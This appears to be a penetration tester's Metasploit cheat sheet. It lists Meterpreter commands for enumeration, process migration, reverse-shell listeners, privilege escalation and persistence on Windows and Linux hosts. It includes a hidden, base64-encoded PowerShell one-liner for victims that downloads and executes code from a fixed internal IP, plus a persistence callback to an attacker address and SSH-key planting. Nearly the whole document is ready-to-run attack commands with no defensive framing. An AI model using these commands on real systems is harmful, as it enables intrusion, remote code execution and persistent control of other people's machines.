# Metasploit

<details>

<summary>Useful commands</summary>

### Enumeration

```bash
sysinfo
getuid
```

### Enable Logging

```
spool /tmp/victim1.log
```

### Setting global variables

```sh
setg LHOST 192.168.1.101
```

### Running a command and seeing the output

```bash
execute -i -H -f "cmd"
```

</details>

<details>

<summary>Migrate Process</summary>

### Create Hidden instance of Notepad & Migration

```bash
execute -H -f notepad
migrate <pid of notepad>
```

### Automates the migration of the Meterpreter session

```bash
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.119.160
set LPORT 80
set AutoRunScript post/windows/manage/migrate
```

</details>

<details>

<summary>Setup listener</summary>

```sh
set exploit/multi/handler
```

```sh
set payload linux/x64/meterpreter/reverse_tcp
```

</details>

<details>

<summary>From Windows Rev Shell to Meterpreter</summary>

On attacker:

```bash
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_http
show targets
set target 2 --> for powershell
run -j
```

On victim:

* Run the command that was being output by metasploit

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABhAFkAbwBTAEIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAYQBZAG8AUwBCAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAYQBZAG8AUwBCAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AMgAwAC4AMgAwADIALwBwAHgAMgBDAE8AdgBwAEwAdAB0ADEAQQBwAEIALwBTAE0AZAA5ADUAWgBSAHUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADIAMAAuADIAMAAyAC8AcAB4ADIAQwBPAHYAcABMAHQAdAAxAEEAcABCACcAKQApADsA
```

</details>

<details>

<summary>PrivEsc</summary>

```bash
run post/multi/recon/local_exploit_suggester
```

Eg:

```
use exploit/windows/local/ms16_014_wmi_recv_notif
```

```bash
set session [meterpreter SESSION number]
```

```
set LPORT 5555
```

```
run
```

</details>

<details>

<summary>Persistency</summary>

#### Windows:

```sh
set AutoRunScript /tmp/commands.rc
```

`/tmp/commands.rc`

```
run persistence -U -i 5 -p 443 -r 192.168.233.153
```

#### Linux:

```sh
set AutoRunScript post/linux/manage/sshkey_persistence
```

</details>

